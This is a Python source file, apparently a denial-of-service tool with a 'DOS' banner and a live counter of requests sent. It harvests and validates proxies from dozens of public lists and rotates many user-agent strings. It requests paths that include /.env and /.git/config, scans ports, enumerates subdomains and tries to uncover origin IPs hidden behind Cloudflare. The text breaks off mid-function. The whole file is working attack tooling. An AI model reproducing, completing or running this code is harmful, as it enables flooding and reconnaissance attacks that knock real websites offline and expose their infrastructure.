import sys
import os
import ssl
import io
import time
import random
import socket
import asyncio
import aiohttp
import threading
import base64
import msvcrt
from collections import deque
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
    "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://api.openproxylist.xyz/http.txt",
    "https://api.openproxylist.xyz/https.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/proxies.txt",
    "https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/http.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/https.txt",
    "https://proxyspace.pro/http.txt",
    "https://proxyspace.pro/https.txt",
    "https://sunny9577.github.io/proxy-scraper/proxies.txt",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=https&proxy_format=ipport&format=text&timeout=20000",
]

PROXY_CACHE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy_cache.txt")
VALIDATION_TIMEOUT = 3.0
MAX_PROXY_LATENCY = 2.5
MIN_PROXY_POOL = 20

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 OPR/115.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/25.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 16033.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS aarch64 16074.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/140.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-A556B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; CPH2651) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2311DRK48G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; HarmonyOS; ALN-AL80) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-X816B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 15; Mobile; rv:139.0) Gecko/139.0 Firefox/139.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:138.0) Gecko/138.0 Firefox/138.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/140.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 8.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 TV Safari/537.36",
    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 WebAppManager",
    "Mozilla/5.0 (PlayStation 5; CPU 4.00GHz) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Xbox Series X; Xbox;rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Linux; Android 11; KFTRPWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/130.0.0.0 Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/24.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-S938U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 16; CPH2699) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; 2412DPN0C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.6; rv:142.0) Gecko/20100101 Firefox/142.0",
    "Mozilla/5.0 (Android 16; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0",
    "Mozilla/5.0 (Linux; Android 15; SM-X916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 27_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/27.0 Mobile/15E148 Safari/604.1",
]

PRIMARY_PATHS = ["/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
                 "/index.html", "/index.php", "/home"]
SECONDARY_PATHS = ["/about", "/contact", "/login", "/signup",
                   "/api/v1/users", "/api/v2/status", "/api/health",
                   "/api/v1/", "/api/v2/", "/api/users", "/api/products"]
FUZZ_PATHS = ["/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
              "/admin/", "/search?q={}", "/dashboard", "/panel",
              "/.env", "/.git/config", "/.well-known/security.txt",
              "/wp-content/plugins/", "/wp-content/themes/",
              "/server-status", "/phpinfo.php", "/info.php",
              "/api/v3/auth", "/oauth/token", "/cpanel", "/webmail",
              "/api/orders", "/api/graphql"]

PORTS_TO_SCAN = [21,22,25,53,80,110,143,443,465,587,993,995,1433,1521,3306,3389,5432,5800,5900,6379,8080,8443,8888,9090,27017]
CF_SUBS = ["direct","origin","direct-connect","cpanel","webmail","mail","ftp","dev","staging","api","www","cdn","gateway","admin"]
SUBDOMAIN_COMMON = ["www","mail","ftp","dev","staging","api","admin","blog","shop","cdn","m","mobile","app","dashboard","panel","cpanel","webmail","vpn","ns1","ns2","dns","gateway","portal","test","support","status","monitor","metrics","logs","docs","help","kb","wiki","assets","static","media","img","images","files","download","secure","ssl","auth","sso","login","account","billing","cloud","host","server","remote"]

TECH_SIGNATURES = {
    "Cloudflare":["cf-ray","__cfduid","cf-cache-status","cloudflare"],
    "CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
    "Akamai":["x-akamai-transformed"],
    "Fastly":["x-served-by","x-cache-hits"],
    "Nginx":["server: nginx"],
    "Apache":["server: apache"],
    "IIS":["server: microsoft-iis"],
    "PHP":["x-powered-by: php"],
    "Node.js":["x-powered-by: express"],
    "WordPress":["wp-json","wp-content"],
}

running = True
stopped = False
lock = threading.Lock()
total_sent = 0
total_failed = 0
total_success = 0
last_http_code = 0
last_code_label = ""
req_rate = 0.0
rate_times = deque(maxlen=400)
proxy_pool = []
proxy_alive = 0
proxy_index = 0
proxy_lock = threading.Lock()
bypass_active = False
proxy_mode = False
known_good_paths = []
total_proxy_used = 0
total_direct_used = 0
proxy_validate_done = threading.Event()
proxy_validate_result = []

def gen_ip():
    r = random.randint
    return f"{r(1,223)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"

def next_proxy():
    global proxy_index
    if not proxy_pool:
        return None
    with proxy_lock:
        p = proxy_pool[proxy_index % len(proxy_pool)]
        proxy_index = (proxy_index + 1) % len(proxy_pool)
        return f"http://{p}"

def remove_bad_proxy(proxy_str):
    global proxy_pool, proxy_alive
    clean = proxy_str.replace("http://", "")
    with proxy_lock:
        if clean in proxy_pool:
            proxy_pool.remove(clean)
            proxy_alive = len(proxy_pool)
            _save_proxy_cache()

def pick_path():
    if bypass_active and known_good_paths and random.random() < 0.7:
        return random.choice(known_good_paths)
    r = random.random()
    if r < 0.40:
        return random.choice(PRIMARY_PATHS)
    elif r < 0.75:
        return random.choice(SECONDARY_PATHS)
    return random.choice(FUZZ_PATHS).replace("{}", str(random.randint(10000, 99999)))

def code_label(code):
    m = {200:"OK",201:"CREATED",301:"MOVED",302:"FOUND",304:"NOT MODIFIED",
         400:"BAD REQ",401:"UNAUTHORIZED",403:"FORBIDDEN",404:"NOT FOUND",
         405:"METHOD NA",429:"RATE LIMITED",500:"SRV ERROR",502:"BAD GATEWAY",
         503:"SERVICE DOWN",504:"GATEWAY TO"}
    return m.get(code, str(code))

def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except Exception:
        pass

def any_key():
    safe_print("\nPress any key to exit...")
    sys.stdout.flush()
    try:
        msvcrt.getch()
    except Exception:
        input()

def prompt_yn(prompt_text):
    safe_print(prompt_text, end="", flush=True)
    while True:
        try:
            ch = msvcrt.getch().lower()
            if ch in (b'y', b'n'):
                safe_print(ch.decode())
                return ch == b'y'
        except Exception:
            return input().strip().lower() == "y"

def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    safe_print(r"""
  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
 /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
 \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
""")

def print_live():
    global total_sent, total_failed, total_success, last_http_code, last_code_label, req_rate, stopped
    global proxy_mode, proxy_alive, bypass_active
    if stopped:
        return
    os.system("cls" if os.name == "nt" else "clear")
    safe_print(r"""
  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
 /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
 \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
""")
    last_str = f"{last_http_code} / {last_code_label}" if last_http_code else "— / —"
    px_str = f"Yes / {proxy_alive} alive" if proxy_mode else "No"
    bp_str = "Yes" if bypass_active else "No"
    safe_print(f" Request sent      : {total_sent}")
    safe_print(f" Request failed    : {total_failed}")
    safe_print(f" Request success   : {total_success}")
    safe_print(f" Proxy             : {px_str}")
    safe_print(f" Bypass            : {bp_str}")
    safe_print(f" Last request      : {last_str}")
    safe_print(f"\n Press Ctrl+C to stop.")

def _load_proxy_cache():
    if not os.path.isfile(PROXY_CACHE_FILE):
        return []
    try:
        with open(PROXY_CACHE_FILE, "r") as f:
            return [line.strip() for line in f if line.strip() and ":" in line]
    except Exception:
        return []

def _save_proxy_cache():
    global proxy_pool
    try:
        with proxy_lock:
            current = list(proxy_pool)
        with open(PROXY_CACHE_FILE, "w") as f:
            for p in current[:500]:
                f.write(p + "\n")
    except Exception:
        pass

async def _fetch_proxies_from_url(session, url):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            text = await resp.text()
            out = set()
            for line in text.split("\n"):
                line = line.strip()
                if not line or line.startswith(("#","/","!","<","[")):
                    continue
                if any(t in line.lower() for t in ["<html","doctype","alert(","script","<?xml"]):
                    continue
                clean = line.replace(" ","").replace("\t","")
                parts = clean.split(":")
                if len(parts) < 1:
                    continue
                ip = parts[0]
                octets = ip.split(".")
                if len(octets) != 4:
                    continue
                try:
                    o = [int(x) for x in octets]
                    if not all(0 <= x <= 255 for x in o):
                        continue
                    if o[0] == 0 or o[0] == 127 or o[0] >= 224:
                        continue
                    if o[0] == 10:
                        continue
                    if o[0] == 172 and 16 <= o[1] <= 31:
                        continue
                    if o[0] == 192 and o[1] == 168:
                        continue
                except ValueError:
                    continue
                port = "80"
                if len(parts) > 1:
                    p = parts[1]
                    if p.isdigit() and 1 <= int(p) <= 65535:
                        port = p
                out.add(f"{ip}:{port}")
            return list(out)
    except Exception:
        return []

async def _fetch_all_proxies():
    connector = aiohttp.TCPConnector(ssl=True, limit=20, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [_fetch_proxies_from_url(session, u) for u in PROXY_SOURCES]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_p = set()
        for r in results:
            if isinstance(r, list):
                all_p.update(r)
        return list(all_p)

def fetch_online_proxies():
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        proxies = loop.run_until_complete(_fetch_all_proxies())
        loop.close()
        return proxies
    except Exception:
        return []

async def _test_proxy(session, pstr, test_url):
    try:
        t0 = time.time()
        async with session.get(test_url, proxy=f"http://{pstr}",
                               timeout=aiohttp.ClientTimeout(total=VALIDATION_TIMEOUT)) as resp:
            await resp.read()
            lat = time.time() - t0
            if resp.status == 200:
                return (pstr, lat)
    except Exception:
        pass
    return None

async def _validate_batch(proxies, test_url, max_batch=800):
    connector = aiohttp.TCPConnector(ssl=False, limit=150, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(150)
        async def bounded(p):
            async with sem:
                return await _test_proxy(session, p, test_url)
        sample = proxies[:max_batch] if len(proxies) > max_batch else proxies
        tasks = [asyncio.create_task(bounded(p)) for p in sample]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        valid = []
        for r in results:
            if r and isinstance(r, tuple):
                pstr, lat = r
                if lat <= MAX_PROXY_LATENCY:
                    valid.append(pstr)
        return valid, len(sample)

def _run_proxy_validation(proxies, test_url):
    global proxy_validate_result, proxy_validate_done
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        old_stderr = sys.stderr
        sys.stderr = io.StringIO()
        try:
            result = loop.run_until_complete(_validate_batch(proxies, test_url))
        finally:
            sys.stderr = old_stderr
        loop.close()
        proxy_validate_result = result
    except Exception as e:
        proxy_validate_result = ([], 0)
    finally:
        proxy_validate_done.set()

def validate_proxies_background(proxies, test_url):
    global proxy_validate_done, proxy_validate_result
    proxy_validate_done.clear()
    proxy_validate_result = ([], 0)
    threading.Thread(target=_run_proxy_validation, args=(proxies, test_url), daemon=True).start()

def resolve_dns(host):
    ips = set()
    try:
        for _, _, _, _, addr in socket.getaddrinfo(host, 80, socket.AF_INET, socket.SOCK_STREAM):
            ips.add(addr[0])
    except Exception:
        pass
    return list(ips)

def resolve_dns_full(host):
    result = {"A":[],"AAAA":[],"CNAME":None}
    try:
        for family, _, _, canonname, addr in socket.getaddrinfo(host, 80):
            if canonname and canonname != host:
                result["CNAME"] = canonname
            if family == socket.AF_INET:
                result["A"].append(addr[0])
            elif hasattr(socket, "AF_INET6") and family == socket.AF_INET6:
                result["AAAA"].append(addr[0])
    except Exception:
        pass
    return result

def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

def scan_ports_parallel(ip, ports):
    open_ports = []
    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = {ex.submit(scan_port, ip, p): p for p in ports}
        for fut in as_completed(futures):
            if fut.result():
                open_ports.append(futures[fut])
    return sorted(open_ports)

def find_origin(host):
    origins = set()
    for sub in CF_SUBS:
        sd = f"{sub}.{host}"
        ips = resolve_dns(sd)
        if ips:
            origins.update(ips)
    return list(origins)

def enumerate_subdomains(host):
    found = {}
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {}
        for sub in SUBDOMAIN_COMMON:
            sd = f"{sub}.{host}"
            futures[ex.submit(resolve_dns, sd)] = sd
        for fut in as_completed(futures):
            ips = fut.result()
            if ips:
                found[futures[fut]] = ips
    return found

def get_ssl_cert_info(host, port=443):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
